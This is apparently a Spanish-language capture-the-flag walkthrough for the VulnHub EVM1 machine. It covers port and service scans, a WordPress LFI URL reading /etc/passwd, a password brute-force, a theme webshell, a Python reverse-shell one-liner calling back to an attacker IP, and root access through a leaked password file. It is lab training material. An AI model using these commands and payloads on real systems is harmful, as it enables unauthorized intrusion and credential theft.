# EVM1
Desarrollo del CTF EVM1

## 1. Configuración de la VM

- Download VM: https://www.vulnhub.com/entry/evm-1,391/
- La VM no funciona en VMWARE WORKSTATION (la interfaz de red no funciona). Solo funciona en VIRTUALBOX.

## 2. Escaneo de Puertos

```
Nmap 7.91 scan initiated Tue Apr 20 09:32:39 2021 as: nmap -n -P0 -p- -sS -sC -sV -vv -T5 -oA full 192.168.56.103
Nmap scan report for 192.168.56.103
Host is up, received arp-response (0.00086s latency).
Scanned at 2021-04-20 09:32:40 EDT for 21s
Not shown: 65528 closed ports
Reason: 65528 resets
PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0defjjR1wkIrdUKeTlYiEG2/PwOaaBSPs+pp11hljbqRiUim5Kkf5QCQXS5SsQE2ljdKAVzFbdIgwtGc1TPp1UAgi55uGyzuZMGDN5vItwvzzZxcrkS9CuH9NeBQh52Ak6Ki5gsgUf/odg90om62mSVX43mLP4v9nk51qnTc2InstJF37GXqGl05RaGjnramVbP/7vLTX5ondW0hfnwFjtsjkT8w1itwI/dGL/4tMnw+khj5BnTFOTxxC0S+tPlY3dE+jM31i2ftpEB5jOD74Fxeng6JF1/8fQi8o+9EeJcMUUs8fd9ygw1BNwzCU7gGCysz6yH62ENKApjO/WX+r
|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGbko+cI1o2lFazvX9zJXiqPBgUYyd110OTvgudv/xMdK7IIJkskJ/kVm6XHHre472oDWrmxJRQfTnOS1EgJbTY=
|   256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILux3BHKEWIkPrmFBz8ag3x3ZZBF638RTPw3GJ+ynllV
53/tcp  open  domain      syn-ack ttl 64 ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        syn-ack ttl 64 Dovecot pop3d
|_pop3-capabilities: RESP-CODES SASL CAPA PIPELINING AUTH-RESP-CODE UIDL TOP
139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 64 Dovecot imapd
|_imap-capabilities: have listed LITERAL+ ID more Pre-login post-login LOGINDISABLEDA0001 OK IDLE capabilities LOGIN-REFERRALS SASL-IR ENABLE IMAP4rev1
445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 08:00:27:77:23:E4 (Oracle VirtualBox virtual NIC)
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   UBUNTU-EXTERMEL<00>  Flags: <unique><active>
|   UBUNTU-EXTERMEL<03>  Flags: <unique><active>
|   UBUNTU-EXTERMEL<20>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14280/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38790/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 63130/udp): CLEAN (Failed to receive data)
|   Check 4 (port 39941/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE\x00
|   Domain name: \x00
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2021-04-20T09:32:54-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-20T13:32:54
|_  start_date: N/A
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm1.jpg" width=80% />


## 3. Enumeración de Servicios

## 3.1. Enumeración NETBIOS/SMB

- No encontramos nada importante.

```
enum4linux -a -M -l -d 192.168.56.103

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr 20 09:39:48 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.56.103
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.56.103    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.56.103    |
 ============================================== 
Looking up status of 192.168.56.103
	UBUNTU-EXTERMEL <00> -         B <ACTIVE>  Workstation Service
	UBUNTU-EXTERMEL <03> -         B <ACTIVE>  Messenger Service
	UBUNTU-EXTERMEL <20> -         B <ACTIVE>  File Server Service
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.56.103    |
 ======================================= 
[+] Server 192.168.56.103 allows sessions using username '', password ''

```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm2.jpg" width=80% />


## 3.2. Enumeración HTTP

- Probemos GOBUSTER y NIKTO.

```
└─# gobuster dir -u http://192.168.56.103/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.103/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/04/20 19:14:39 Starting gobuster
===============================================================
/wordpress (Status: 301)
===============================================================
2021/04/20 19:15:01 Finished
===============================================================
```

```
┌──(root💀kali)-[~/EVM/autorecon/192.168.56.103/scans]
└─# nikto -h http://192.168.56.103
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2021-04-20 19:15:30 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2a45, size: 5964d0a414860, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ /info.php: Output from the phpinfo() function was found.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 7915 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-04-20 19:16:22 (GMT-4) (52 seconds)
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm3.jpg" width=80% />

> Encontramos una carpeta de WORDPRESS y un archivo info.php

## 3.3. Enumeración WORDPRESS

- Enumeramos Wordpress: plugins, vulnerabilidades y usuarios.
- Encontramos un usuario y una vulnerabilidad LFI.

```
┌──(root💀kali)-[~/EVM]
└─# wpscan --api-token API_KEY --url=http://192.168.56.103/wordpress/ --disable-tls-checks -e ap,u --plugins-detection aggressive

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.56.103/wordpress/ [192.168.56.103]
[+] Started: Tue Apr 20 10:12:06 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] photo-gallery
 | Location: http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/
 | Last Updated: 2021-04-06T13:39:00.000Z
 | Readme: http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/readme.txt
 | [!] The version is out of date, the latest version is 1.5.71
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.103/wordpress/wp-content/plugins/photo-gallery/, status: 200
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: Photo Gallery by 10Web < 1.5.35 - SQL Injection & XSS
 |     Fixed in: 1.5.35
 |     References:
 |      - https://wpscan.com/vulnerability/9875076d-e84e-4deb-a3d3-06d877b41085
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16117
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16118
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16119
| [!] Title: Photo Gallery by 10Web < 1.5.55 - Unauthenticated SQL Injection
 |     Fixed in: 1.5.55
 |     References:
 |      - https://wpscan.com/vulnerability/2e33088e-7b93-44af-aa6a-e5d924f86e28
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24139
 |      - https://plugins.trac.wordpress.org/changeset/2304193

[+] wp-vault
 | Location: http://192.168.56.103/wordpress/wp-content/plugins/wp-vault/
 | Latest Version: 0.8.6.6 (up to date)
 | Last Updated: 2008-02-23T05:44:00.000Z
 | Readme: http://192.168.56.103/wordpress/wp-content/plugins/wp-vault/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.56.103/wordpress/wp-content/plugins/wp-vault/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Vault 0.8.6.6 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpscan.com/vulnerability/99f98dda-14cf-43fb-bc6c-123f78b44ea7
 |      - https://www.exploit-db.com/exploits/40850/
 |      - https://lenonleite.com.br/en/2016/11/30/wp-vault-0-8-6-6

[+] c0rrupt3d_brain
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.56.103/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm4.jpg" width=80% />


## 4. Explotando la vulnerabilidad

### 4.1. Local File Inclusion (LFI)

http://192.168.56.103/wordpress/?wpv-image=../../../../../../../../etc/passwd
- La vulnerabilidad está detallada aquí: https://www.exploit-db.com/exploits/40850


<img src="https://github.com/El-Palomo/EVM1/blob/main/evm5.jpg" width=80% />

- Intenté buscar archivos que pueda leer para realizar un POISONING y ejecutar comandos. No encontré ninguno.

### 4.2. Cracking ONLINE

- Teníamos el usuario "c0rrupt3d_brain", tocaba intentar un ataque clásico de diccionario.

```
┌──(root💀kali)-[~/EVM]
└─# wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain --passwords /usr/share/wordlists/rockyou.txt -t 50

[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0rrupt3d_brain / 24992499                                                                                         
Trying c0rrupt3d_brain / annette1 Time: 00:03:33 <                                   > (10700 / 14355092)  0.07%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0rrupt3d_brain, Password: 24992499
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm6.jpg" width=80% />

### 4.3. WEBSHELL a través de Wordpress

- Ahora que ya teníamos acceso a Wordpress. Tenemos dos opciones: Subir un THEME con una webshell o EDITAR un theme/plugin para colocar una webshell. el primero resultó el más facil.

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm7.jpg" width=80% />

```
http://192.168.56.103/wordpress/wp-content/themes/hestia/cmd.php?cmd=whoami
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm8.jpg" width=80% />

- Ahora obtener SHELL reversa.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.104",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm9.jpg" width=80% />

## 5. Explotando la vulnerabilidad

- Ahora toca buscar informacion sensible de usuarios del sistema.

```
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ ls -laR
ls -laR
.:
total 12
drwxr-xr-x  3 root     root     4096 Oct 30  2019 .
drwxr-xr-x 23 root     root     4096 Oct 30  2019 ..
drwxr-xr-x  3 www-data www-data 4096 Nov  1  2019 root3r

./root3r:
total 40
drwxr-xr-x 3 www-data www-data 4096 Nov  1  2019 .
drwxr-xr-x 3 root     root     4096 Oct 30  2019 ..
-rw-r--r-- 1 www-data www-data  515 Oct 30  2019 .bash_history
-rw-r--r-- 1 www-data www-data  220 Oct 30  2019 .bash_logout
-rw-r--r-- 1 www-data www-data 3771 Oct 30  2019 .bashrc
drwxr-xr-x 2 www-data www-data 4096 Oct 30  2019 .cache
-rw-r--r-- 1 www-data www-data   22 Oct 30  2019 .mysql_history
-rw-r--r-- 1 www-data www-data  655 Oct 30  2019 .profile
-rw-r--r-- 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt
-rw-r--r-- 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root     root        4 Nov  1  2019 test.txt

./root3r/.cache:
total 8
drwxr-xr-x 2 www-data www-data 4096 Oct 30  2019 .
drwxr-xr-x 3 www-data www-data 4096 Nov  1  2019 ..
-rw-r--r-- 1 www-data www-data    0 Oct 30  2019 motd.legal-displayed
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm10.jpg" width=80% />


- Está super sencillo esta vez, encontramos el password: willy26

```
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ cat root3r/.root_password_ssh.txt
<ulnerable-m4ch1ine:/home$ cat root3r/.root_password_ssh.txt                 
willy26
```

```
www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home$ su root
su root
Password: willy26

root@ubuntu-extermely-vulnerable-m4ch1ine:/home# cd 
cd 
root@ubuntu-extermely-vulnerable-m4ch1ine:~# cat proof.txt
cat proof.txt
voila you have successfully pwned me :) !!!
:D
```

<img src="https://github.com/El-Palomo/EVM1/blob/main/evm11.jpg" width=80% />



